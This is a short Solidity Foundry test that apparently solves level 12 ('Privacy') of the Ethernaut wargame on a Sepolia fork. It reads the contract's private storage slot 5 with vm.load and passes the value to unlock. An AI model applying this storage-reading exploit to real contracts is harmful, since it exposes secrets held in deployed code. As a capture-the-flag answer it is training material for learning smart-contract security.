// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/12-Privacy/Privacy.sol";

contract ContractTest is Test {
    Privacy level12 = Privacy(payable(0x34e0Ec7d959166c773c24883CEA09aD1874540f3));

    function setUp() public {
    //Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit12() public {

        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
    }
  receive() external payable {}
}
